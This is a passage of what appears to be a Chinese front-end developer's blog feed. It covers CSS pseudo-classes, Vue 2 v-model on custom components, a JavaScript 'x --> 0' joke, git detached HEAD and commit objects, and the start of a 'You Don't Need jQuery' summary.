:future</h2><blockquote><p>暂无</p></blockquote><h2 id="二十二、-has"><a href="#二十二、-has" class="headerlink" title="二十二、 :has"></a>二十二、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:has">:has</a></h2><blockquote><p><strong>暂无浏览器支持</strong></p></blockquote><h2 id="二十三、-horizontal"><a href="#二十三、-horizontal" class="headerlink" title="二十三、 :horizontal"></a>二十三、 :horizontal</h2><blockquote><p>暂无</p></blockquote><h2 id="二十四、-host"><a href="#二十四、-host" class="headerlink" title="二十四、 :host"></a>二十四、 :host</h2><blockquote><p>暂无</p></blockquote><h2 id="二十五、-host"><a href="#二十五、-host" class="headerlink" title="二十五、 :host()"></a>二十五、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:host()">:host()</a></h2><blockquote><p>配合 <code>shodow DOM</code> 使用</p></blockquote><h2 id="二十六、-host-context"><a href="#二十六、-host-context" class="headerlink" title="二十六、 :host-context()"></a>二十六、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:host-context()">:host-context()</a></h2><blockquote><p>配合 <code>shodow DOM</code> 使用</p></blockquote><h2 id="二十七、-hover"><a href="#二十七、-hover" class="headerlink" title="二十七、 :hover"></a>二十七、 :hover</h2><blockquote><p>常用方法</p></blockquote><h2 id="二十八、-in-range"><a href="#二十八、-in-range" class="headerlink" title="二十八、 :in-range"></a>二十八、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:in-range">:in-range</a></h2><blockquote><p>代表一个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input" title="HTML &lt;input&gt; 元素用于为基于Web的表单创建交互式控件，以便接受来自用户的数据; 可以使用各种类型的输入数据和控件小部件，具体取决于设备和user agent。"><code>&lt;input&gt;</code></a> 元素，其当前值处于属性<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input#attr-min"><code>min</code></a> 和<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input#attr-max"><code>max</code></a> 限定的范围之内<br><a href="https://codepen.io/melonxx/pen/xergKB?&editable=true">栗子</a></p></blockquote><h2 id="二十九、-increment"><a href="#二十九、-increment" class="headerlink" title="二十九、 :increment"></a>二十九、 :increment</h2><blockquote><p>暂无</p></blockquote><h2 id="三十、-indeterminate"><a href="#三十、-indeterminate" class="headerlink" title="三十、 :indeterminate"></a>三十、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:indeterminate">:indeterminate</a></h2><blockquote><p>表示状态不确定的表单元素<br><a href="https://codepen.io/melonxx/pen/MRoJgV?&editable=true">栗子</a></p></blockquote><h2 id="三十一、-invalid"><a href="#三十一、-invalid" class="headerlink" title="三十一、 :invalid"></a>三十一、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:invalid">:invalid</a></h2><blockquote><p>表示任意内容未通过验证的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input" title="HTML &lt;input&gt; 元素用于为基于Web的表单创建交互式控件，以便接受来自用户的数据; 可以使用各种类型的输入数据和控件小部件，具体取决于设备和user agent。"><code>&lt;input&gt;</code></a> 或其他 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/form" title="HTML &lt;form&gt; 元素 表示了文档中的一个区域，这个区域包含有交互控制元件，用来向web服务器提交信息。"><code>&lt;form&gt;</code></a> 元素<br><a href="https://codepen.io/melonxx/pen/vMZgBE?&editable=true">栗子</a></p></blockquote><h2 id="三十二、-is"><a href="#三十二、-is" class="headerlink" title="三十二、 :is"></a>三十二、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:is">:is</a></h2><blockquote><p><code>:matches</code></p></blockquote><h2 id="三十三、-lang"><a href="#三十三、-lang" class="headerlink" title="三十三、 :lang()"></a>三十三、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:lang">:lang()</a></h2><blockquote><p>基于元素语言来匹配页面元素<br><a href="https://codepen.io/melonxx/pen/jRwVgG?&editable=true">栗子</a></p></blockquote><h2 id="三十四、-last-child"><a href="#三十四、-last-child" class="headerlink" title="三十四、 :last-child"></a>三十四、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:last-child">:last-child</a></h2><blockquote><p>常用方法</p></blockquote><h2 id="三十五、-last-of-type"><a href="#三十五、-last-of-type" class="headerlink" title="三十五、 :last-of-type"></a>三十五、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:last-of-type">:last-of-type</a></h2><blockquote><p>同理 <code>:first-of-type</code> <a href="https://codepen.io/melonxx/pen/gyRgWg?&editable=true">栗子</a></p></blockquote><h2 id="三十六、-left"><a href="#三十六、-left" class="headerlink" title="三十六、 :left"></a>三十六、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:left">:left</a></h2><blockquote><p>同理 <code>:first</code><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/@page" title="@page 规则用于在打印文档时修改某些CSS属性。你不能用@page规则来修改所有的CSS属性，而是只能修改margin,orphans,widow 和 page breaks of the document。对其他属性的修改是无效的。"><code>@page</code></a> 配套使用, 对打印文档的左侧页设置CSS样式</p></blockquote><h2 id="三十七、-link"><a href="#三十七、-link" class="headerlink" title="三十七、 :link"></a>三十七、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:link">:link</a></h2><blockquote><p>常用方法</p></blockquote><h2 id="三十八、-matches"><a href="#三十八、-matches" class="headerlink" title="三十八、 :matches()"></a>三十八、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:is">:matches()</a></h2><blockquote><p>代表集合 例如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="comment">/* 选择header, main, footer里的任意一个悬浮状态的段落(p标签) */</span></span><br><span class="line">&gt;:<span class="built_in">matches</span>(header, main, footer) p:hover &#123;</span><br><span class="line"> <span class="attribute">color</span>: red;</span><br><span class="line"> <span class="attribute">cursor</span>: pointer;</span><br><span class="line">&gt;&#125;</span><br><span class="line"></span><br><span class="line">&gt;<span class="comment">/* 以上内容相当于以下内容 */</span></span><br><span class="line">&gt;<span class="selector-tag">header</span> <span class="selector-tag">p</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line">&gt;<span class="selector-tag">main</span> <span class="selector-tag">p</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line">&gt;<span class="selector-tag">footer</span> <span class="selector-tag">p</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line"> <span class="attribute">color</span>: red;</span><br><span class="line"> <span class="attribute">cursor</span>: pointer;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><p><a href="https://codepen.io/melonxx/pen/zXzNEQ?&editable=true">栗子</a></p></blockquote><h2 id="三十九、-no-button"><a href="#三十九、-no-button" class="headerlink" title="三十九、 :no-button"></a>三十九、 :no-button</h2><blockquote><p>暂无</p></blockquote><h2 id="四十、-not"><a href="#四十、-not" class="headerlink" title="四十、 :not"></a>四十、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:not">:not</a></h2><blockquote><p>常用方法</p></blockquote><h2 id="四十一、-nth-child"><a href="#四十一、-nth-child" class="headerlink" title="四十一、 :nth-child"></a>四十一、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:nth-child">:nth-child</a></h2><blockquote><p>常用方法</p></blockquote><h2 id="四十一、-nth-last-child"><a href="#四十一、-nth-last-child" class="headerlink" title="四十一、 :nth-last-child"></a>四十一、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:nth-last-child">:nth-last-child</a></h2><blockquote><p>相比 <code>:nth-child</code> 而言，两者顺序相反</p></blockquote><h2 id="四十二、-nth-of-type"><a href="#四十二、-nth-of-type" class="headerlink" title="四十二、 :nth-of-type"></a>四十二、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:nth-of-type">:nth-of-type</a></h2><blockquote><p>类似 <code>:first-of-type</code> 和 <code>:last-of-type</code></p></blockquote><h2 id="四十三、-nth-last-of-type"><a href="#四十三、-nth-last-of-type" class="headerlink" title="四十三、 :nth-last-of-type"></a>四十三、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:nth-last-of-type">:nth-last-of-type</a></h2><blockquote><p>相比 <code>:nth-of-type</code> 而言，两者顺序相反</p></blockquote><h2 id="四十四、-only-child"><a href="#四十四、-only-child" class="headerlink" title="四十四、 :only-child"></a>四十四、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:only-child">:only-child</a></h2><blockquote><p>属于某个父元素的唯一一个子元素</p></blockquote><h2 id="四十五、-only-of-type"><a href="#四十五、-only-of-type" class="headerlink" title="四十五、 :only-of-type"></a>四十五、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:only-of-type">:only-of-type</a></h2><blockquote><p>代表了任意一个元素，这个元素没有其他相同类型的兄弟元素。</p></blockquote><h2 id="四十六、-optional"><a href="#四十六、-optional" class="headerlink" title="四十六、 :optional"></a>四十六、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:optional">:optional</a></h2><blockquote><p>表示任意没有<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input#attr-required"><code>required</code></a>属性的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input" title="HTML &lt;input&gt; 元素用于为基于Web的表单创建交互式控件，以便接受来自用户的数据。"><code>&lt;input&gt;</code></a>，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/select" title="HTML select (&lt;select&gt;) 元素是一种表单控件，可创建选项菜单。菜单内的选项为&lt;option&gt; , 可以由 &lt;optgroup&gt; 元素分组。选项可以被用户预先选择。"><code>&lt;select&gt;</code></a> 或  <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/textarea" title="HTML &lt;textarea&gt; 元素表示一个多行纯文本编辑控件。"><code>&lt;textarea&gt;</code></a> 元素使用它。<br>和 <code>:required</code> 相反</p></blockquote><h2 id="四十七、-out-of-range"><a href="#四十七、-out-of-range" class="headerlink" title="四十七、 :out-of-range"></a>四十七、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:out-of-range">:out-of-range</a></h2><blockquote><p>表示一个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input" title="HTML &lt;input&gt; 元素用于为基于Web的表单创建交互式控件，以便接受来自用户的数据; 可以使用各种类型的输入数据和控件小部件，具体取决于设备和user agent。"><code>&lt;input&gt;</code></a> 元素，其当前值处于属性 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input#attr-min"><code>min</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input#attr-max"><code>max</code></a> 限定的范围外<br>和 <code>:in-range</code> 相反</p></blockquote><h2 id="四十八、-past"><a href="#四十八、-past" class="headerlink" title="四十八、 :past"></a>四十八、 :past</h2><blockquote><p>暂无</p></blockquote><h2 id="四十九、-placeholder-shown"><a href="#四十九、-placeholder-shown" class="headerlink" title="四十九、 :placeholder-shown"></a>四十九、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:placeholder-shown">:placeholder-shown</a></h2><blockquote><p>这个伪类好像只能设置 <code>input</code> 框外的样式，内部样式(例如 <code>color</code> 等)只能用 <code>::placeholder</code> 来改变。</p></blockquote><h2 id="五十、-read-only"><a href="#五十、-read-only" class="headerlink" title="五十、 :read-only"></a>五十、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:read-only">:read-only</a></h2><blockquote><p>表示元素不可被用户编辑的状态（如锁定的文本输入框）<br><strong>注意：这个选择器不只是选择具有 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input#attr-readonly"><code>readonly</code></a> 属性的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input" title="HTML &lt;input&gt; 元素用于为基于Web的表单创建交互式控件，以便接受来自用户的数据; 可以使用各种类型的输入数据和控件小部件，具体取决于设备和user agent。"><code>&lt;input&gt;</code></a> 元素，它也会选择所有的不能被用户编辑的元素。</strong><br><a href="https://codepen.io/melonxx/pen/JVMdOb?&editable=true">栗子</a><br>与 <code>:read-write</code> 相反</p></blockquote><h2 id="五十一、-read-write"><a href="#五十一、-read-write" class="headerlink" title="五十一、 :read-write"></a>五十一、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:read-write">:read-write</a></h2><blockquote><p>代表一个元素（例如可输入文本的 input元素）可以被用户编辑<br><strong>注意：这个选择器不仅仅选择 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input" title="HTML &lt;input&gt; 元素用于为基于Web的表单创建交互式控件，以便接受来自用户的数据; 可以使用各种类型的输入数据和控件小部件，具体取决于设备和user agent。"><code>&lt;input&gt;</code></a> 元素，它也会选择所有可以被用户编辑的元素，例如设置了 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes#attr-contenteditable"><code>contenteditable</code></a> 属性的  <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/p" title="HTML &lt;p&gt;元素（或者说 HTML 段落元素）表示文本的一个段落。该元素通常表现为一整块与相邻文本分离的文本，或以垂直的空白隔离或以首行缩进。另外，&lt;p&gt; 是块级元素。"><code>&lt;p&gt;</code></a> 元素。</strong><br>与 <code>:read-only</code> 相反</p></blockquote><h2 id="五十二、-required"><a href="#五十二、-required" class="headerlink" title="五十二、 :required"></a>五十二、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:required">:required</a></h2><blockquote><p>表示 任意 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input" title="HTML &lt;input&gt; 元素用于为基于Web的表单创建交互式控件，以便接受来自用户的数据; 可以使用各种类型的输入数据和控件小部件，具体取决于设备和user agent。"><code>&lt;input&gt;</code></a> 元素表示任意拥有<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input#attr-required"><code>required</code></a>属性的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input" title="input (&lt;input&gt;) 元素用来创建基于web表单的可交互控件."><code>&lt;input&gt;</code></a> 或 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/textarea" title="The HTML &lt;textarea&gt; element represents a multi-line plain-text editing control."><code>&lt;textarea&gt;</code></a> 元素使用它. 它允许表单在提交之前容易的展示必填字段并且渲染其外观</p></blockquote><h2 id="五十三、-right"><a href="#五十三、-right" class="headerlink" title="五十三、 :right"></a>五十三、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:right">:right</a></h2><p>同理 <code>:first</code><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/@page" title="@page 规则用于在打印文档时修改某些CSS属性。你不能用@page规则来修改所有的CSS属性，而是只能修改margin,orphans,widow 和 page breaks of the document。对其他属性的修改是无效的。"><code>@page</code></a> 配套使用, 对打印文档的左侧页设置CSS样式</p><h2 id="五十四、-root"><a href="#五十四、-root" class="headerlink" title="五十四、 :root"></a>五十四、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:root">:root</a></h2><blockquote><p>常用方法，一般用于 <code>css</code> 变量</p></blockquote><h2 id="五十五、-scope"><a href="#五十五、-scope" class="headerlink" title="五十五、 :scope"></a>五十五、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:scope">:scope</a></h2><blockquote><p>实验属性，<a href="https://codepen.io/melonxx/pen/rbpOYz?&editable=true">自行体会</a></p></blockquote><h2 id="五十六、-single-button"><a href="#五十六、-single-button" class="headerlink" title="五十六、 :single-button"></a>五十六、 :single-button</h2><blockquote><p>暂无</p></blockquote><h2 id="五十七、-start"><a href="#五十七、-start" class="headerlink" title="五十七、 :start"></a>五十七、 :start</h2><blockquote><p>暂无</p></blockquote><h2 id="五十八、-target"><a href="#五十八、-target" class="headerlink" title="五十八、 :target"></a>五十八、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:target">:target</a></h2><blockquote><p>代表一个唯一的页面元素(目标元素)，其<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes#attr-id"><code>id</code></a> 与当前URL片段匹配</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">例如, 以下<span class="built_in">URL</span>拥有一个片段 (以<span class="comment">#标识的) ，该片段指向一个ID为section2的页面元素:</span></span><br><span class="line"><span class="keyword">http</span>://www.example.com/index.html<span class="comment">#section2</span></span><br><span class="line"></span><br><span class="line">若当前<span class="built_in">URL</span>等于上面的<span class="built_in">URL</span>，下面的元素可以通过 :target选择器被选中：</span><br><span class="line">&lt;section id=<span class="string">&quot;section2&quot;</span>&gt;Example&lt;/section&gt;</span><br></pre></td></tr></table></figure></blockquote><h2 id="五十九、-valid"><a href="#五十九、-valid" class="headerlink" title="五十九、 :valid"></a>五十九、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:valid">:valid</a></h2><blockquote><p>CSS <a href="https://developer.mozilla.org/en/CSS/Pseudo-classes" title="Pseudo-classes">伪类</a>表示内容<a href="https://developer.mozilla.org/en/HTML/HTML5/Constraint_validation" title="en/HTML/HTML5/Constraint_validation">验证</a>正确的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input" title="HTML &lt;input&gt; 元素用于为基于Web的表单创建交互式控件，以便接受来自用户的数据; 可以使用各种类型的输入数据和控件小部件，具体取决于设备和user agent。"><code>&lt;input&gt;</code></a> 或其他 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/form" title="HTML &lt;form&gt; 元素 表示了文档中的一个区域，这个区域包含有交互控制元件，用来向web服务器提交信息。"><code>&lt;form&gt;</code></a> 元素。这能简单地将校验字段展示为一种能让用户辨别出其输入数据的正确性的样式。<br>与 <code>invalid</code> 相反</p></blockquote><h2 id="六十、-vertical"><a href="#六十、-vertical" class="headerlink" title="六十、 :vertical"></a>六十、 :vertical</h2><blockquote><p>暂无</p></blockquote><h2 id="六十一、-visited"><a href="#六十一、-visited" class="headerlink" title="六十一、 :visited"></a>六十一、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:visited">:visited</a></h2><blockquote><p>常见方法</p></blockquote><h2 id="六十二、-where"><a href="#六十二、-where" class="headerlink" title="六十二、 :where"></a>六十二、 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:where">:where</a></h2><blockquote><p>草案阶段</p></blockquote><h2 id="六十三、-window-inactive"><a href="#六十三、-window-inactive" class="headerlink" title="六十三、 :window-inactive"></a>六十三、 :window-inactive</h2><blockquote><p>暂无</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VUE2.x已是单项绑定</title>
      <link href="/Blog/2019/04/12/vue/VUE2.x%E5%B7%B2%E6%98%AF%E5%8D%95%E9%A1%B9%E7%BB%91%E5%AE%9A/index/"/>
      <url>/Blog/2019/04/12/vue/VUE2.x%E5%B7%B2%E6%98%AF%E5%8D%95%E9%A1%B9%E7%BB%91%E5%AE%9A/index/</url>
      
        <content type="html"><![CDATA[<p>普通使用v-model</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="attribute">v-model</span>=<span class="string">&quot;searchText&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>等价于：</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">input</span></span><br><span class="line">  v-bind:value=<span class="string">&quot;searchText&quot;</span></span><br><span class="line">  v-<span class="keyword">on</span>:<span class="keyword">input</span>=<span class="string">&quot;searchText = $event.target.value&quot;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>当用在组件上时，v-model 则会这样：</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;custom-<span class="keyword">input</span></span><br><span class="line">  v-bind:value=<span class="string">&quot;searchText&quot;</span></span><br><span class="line">  v-<span class="keyword">on</span>:<span class="keyword">input</span>=<span class="string">&quot;searchText = $event&quot;</span></span><br><span class="line">&gt;&lt;/custom-<span class="keyword">input</span>&gt;</span><br></pre></td></tr></table></figure><p>为了让它正常工作，这个组件内的 <code>&lt;input&gt;</code> 必须：</p><p>将其 value 特性绑定到一个名叫 value 的 prop 上<br>在其 input 事件被触发时，将新的值通过自定义的 input 事件抛出<br>写成代码之后是这样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Vue.<span class="title function_ invoke__">component</span>(<span class="string">&#x27;custom-input&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">props</span>: [<span class="string">&#x27;value&#x27;</span>],</span><br><span class="line">  <span class="attr">template</span>: `</span><br><span class="line">    &lt;input</span><br><span class="line">      v-<span class="attr">bind</span>:value=<span class="string">&quot;value&quot;</span></span><br><span class="line">      v-<span class="attr">on</span>:input=<span class="string">&quot;<span class="subst">$emit</span>(&#x27;input&#x27;, <span class="subst">$event</span>.target.value)&quot;</span></span><br><span class="line">    &gt;</span><br><span class="line">  `</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>现在 v-model 就应该可以在这个组件上完美地工作起来了：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">custom-input</span> <span class="attr">v-model</span>=<span class="string">&quot;searchText&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">custom-input</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JS 里的 --&gt; 符号是什么意思？</title>
      <link href="/Blog/2019/04/10/zch&#39;s_fool/JS%E9%87%8C%E7%9A%84%E2%80%94%E3%80%8B%E7%AC%A6%E5%8F%B7%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D%EF%BC%9F/index/"/>
      <url>/Blog/2019/04/10/zch&#39;s_fool/JS%E9%87%8C%E7%9A%84%E2%80%94%E3%80%8B%E7%AC%A6%E5%8F%B7%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D%EF%BC%9F/index/</url>
      
        <content type="html"><![CDATA[<p>这是 <a href="https://stackoverflow.com/questions/1642028/what-is-the-operator-in-c">Stackoverflow 上的一个问答</a>（我稍微改了一下）</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">while</span> (x --&gt; <span class="number">0</span>)&#123; <span class="comment">// x 趋近于 0</span></span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(x)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>请问 –&gt; 这个符号是做什么用的？</p><p>相信你看了这个问题之后表情是这样的：</p><p><img src="/Blog/2019/04/10/zch's_fool/JS%E9%87%8C%E7%9A%84%E2%80%94%E3%80%8B%E7%AC%A6%E5%8F%B7%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D%EF%BC%9F/index/img.png"></p><p>居然有人把 (x–) &gt; 0 看成 –&gt; 符号！！！想象力好丰富，我怎么没想到！</p><p>估计这个笑话只有程序员懂，哈哈。</p><p>回答更搞笑！下面这个回答发明了「下滑到」符号！！！</p><p><img src="/Blog/2019/04/10/zch's_fool/JS%E9%87%8C%E7%9A%84%E2%80%94%E3%80%8B%E7%AC%A6%E5%8F%B7%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D%EF%BC%9F/index/img_1.png"></p><p>下面这个答案，发明了「快速滑向符号」</p><p><img src="/Blog/2019/04/10/zch's_fool/JS%E9%87%8C%E7%9A%84%E2%80%94%E3%80%8B%E7%AC%A6%E5%8F%B7%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D%EF%BC%9F/index/img_2.png"></p><p><img src="/Blog/2019/04/10/zch's_fool/JS%E9%87%8C%E7%9A%84%E2%80%94%E3%80%8B%E7%AC%A6%E5%8F%B7%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D%EF%BC%9F/index/img_3.png"></p><p>高，手，在，民，间。请收下我的膝盖。</p>]]></content>
      
      
      <categories>
          
          <category> 趣闻 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>分离头指针</title>
      <link href="/Blog/2019/04/10/shell/%E5%88%86%E7%A6%BB%E5%A4%B4%E6%8C%87%E9%92%88/index/"/>
      <url>/Blog/2019/04/10/shell/%E5%88%86%E7%A6%BB%E5%A4%B4%E6%8C%87%E9%92%88/index/</url>
      
        <content type="html"><![CDATA[<p>当我们创建分支时，可能会出现这样子的情况。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">git</span> checkout 某次commit的编码</span><br></pre></td></tr></table></figure><p>此时将会进入分离头</p><p><img src="/Blog/2019/04/10/shell/%E5%88%86%E7%A6%BB%E5%A4%B4%E6%8C%87%E9%92%88/index/img.png"></p><p>git 也会温馨提示你 <code>detached HEAD</code>，此时你的commit不会和任何现有分支挂钩。</p><p>此时如果一旦切换分支，在这种状态下所有的 <code>commit</code> 都不会被 <code>git</code> 记录。</p><p>但是Git 都会提示并引导你创建合并该分支</p><p><img src="/Blog/2019/04/10/shell/%E5%88%86%E7%A6%BB%E5%A4%B4%E6%8C%87%E9%92%88/index/img_1.png"></p><h5 id="坏处：此状态下所有的commit都会被清除。"><a href="#坏处：此状态下所有的commit都会被清除。" class="headerlink" title="坏处：此状态下所有的commit都会被清除。"></a>坏处：此状态下所有的commit都会被清除。</h5><h5 id="好处：利用该状态可以做测试commit。"><a href="#好处：利用该状态可以做测试commit。" class="headerlink" title="好处：利用该状态可以做测试commit。"></a>好处：利用该状态可以做测试commit。</h5>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>commit、tree和blob三个对象之间的关系</title>
      <link href="/Blog/2019/04/09/shell/commit%E3%80%81tree%E5%92%8Cblob%E4%B8%89%E4%B8%AA%E5%AF%B9%E8%B1%A1%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB/index/"/>
      <url>/Blog/2019/04/09/shell/commit%E3%80%81tree%E5%92%8Cblob%E4%B8%89%E4%B8%AA%E5%AF%B9%E8%B1%A1%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB/index/</url>
      
        <content type="html"><![CDATA[<p><img src="/Blog/2019/04/09/shell/commit%E3%80%81tree%E5%92%8Cblob%E4%B8%89%E4%B8%AA%E5%AF%B9%E8%B1%A1%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB/index/img.png"></p>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>You-Dont-Need-jQuery</title>
      <link href="/Blog/2019/04/08/essay/You-Dont-Need-jQuery/index/"/>
      <url>/Blog/2019/04/08/essay/You-Dont-Need-jQuery/index/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md">github</a></p><blockquote><p>前端发展很快，现代浏览器原生 API 已经足够好用。我们并不需要为了操作 DOM、Event 等再学习一下 jQuery 的 API。同时由于 React、Angular、Vue 等框架的流行，直接操作 DOM 不再是好的模式，jQuery 使用场景大大减少。本项目总结了大部分 jQuery API 替代的方法，暂时只支持 IE10 以上浏览器。</p></blockquote><h2 id="Query-Selector"><a href="#Query-Selector" class="headerlink" title="Query Selector"></a>Query Selector</h2><blockquote><p>注意：<code>document.querySelector</code> 和 <code>document.querySelectorAll</code> 性能很差。如果想提高性能，尽量使用 <code>document.getElementById</code>、<code>document.getElementsByClassName</code> 或 <code>document.getElementsByTagName</code>。</p></blockquote><ul><li><h4 id="1-0-选择器查询"><a href="#1-0-选择器查询" class="headerlink" title="1.0 选择器查询"></a><a href="https://github.com/nefe/You-Dont-Need-jQuery/blob/master/README.zh-CN.md#1.0">1.0</a> 选择器查询</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// jQuery</span><br><span class="line">$(&#x27;selector&#x27;);</span><br><span class="line"></span><br><span class="line">// Native</span><br><span class="line">document.querySelectorAll(&#x27;selector&#x27;);</span><br></pre></td></tr></table></figure></li><li><h4 id="1-1-class-查询"><a href="#1-1-class-查询" class="headerlink" title="1.1 